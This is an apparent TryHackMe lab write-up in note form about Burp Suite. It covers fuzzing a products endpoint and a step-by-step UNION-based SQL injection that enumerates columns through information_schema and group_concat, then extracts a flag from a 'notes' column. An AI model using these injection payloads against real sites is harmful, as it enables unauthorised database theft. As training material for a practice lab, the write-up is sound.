01 Feb 25
 just got back from USCG basic training so im trying to get my bearings back on all my projects.

# Task 7 Challenge

 Launch target machine VM  http://10.10.218.49/products/
 
 Enable intercept again and capture a request to one of the numeric products ==endpoints== in the Proxy module, then forward it to Repeater.
	 foxy proxy running / burpsuite intercepting traffic
	 Intruder> repeater in repeater edit the GET/products/2 to GET/products/-1 I want a "500 internal server error" by changing the number at the end of the request to extreme inputs we can get 500 error.

# Task 8 Extra-mile Challenge

http://10.10.218.49/about/2 our target, send traffic to repeater

Adding a single apostrophe (=='==) is usually enough to cause the server to error when a simple SQLi is present


```
GET /about/2' HTTP/1.1
Host: 10.10.218.49
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

HTTP/1.1 500 INTERNAL SERVER ERROR<
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 16 Aug 2021 23:05:21 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3101

 ***look through the body of the server's response around line 40. The server is telling us the query we tried to execute:***

<code>SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'</code>

* The database table we are selecting from is called people.
* The query selects five columns from the table: firstName, lastName, pfpLink, role, and bio. We can guess where these fit into the page, which will be helpful for when we choose where to place our requests.

As we know the table name and the number of rows, we can use a union query to select the column names for the people table from the columns table in the information_schema default database.

A simple query for this is as follows:
`/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"`

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 16 Aug 2021 22:12:36 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Front-End-Https: on
Content-Length: 3360


`<!DOCTYPE html>`
`<html lang=en>`
    `<head>`
        `<title>`
            `About | id None`
        `</title>`

We have successfully pulled the first column name out of the database, but we now have a problem. The page is only displaying the first matching item — we need to see all of the matching items.

we can use our SQLi to group the results. We can still only retrieve one result at a time, but by using the `group_concat()` function, we can amalgamate all of the column names into a single output:
`/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"`

We have successfully identified eight columns in this table: id, firstName, lastName, pfpLink, role, shortRole, bio, and notes.

Considering our task, it seems a safe bet that our target column is notes.

Finally, we are ready to take the flag from this database — we have all of the information that we need:

    The name of the table: people.
    The name of the target column: notes.
    The ID of the CEO is 1; this can be found simply by clicking on Jameson Wolfe's profile on the /about/ page and checking the ID in the URL.

Let's craft a query to extract this flag:
`0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1`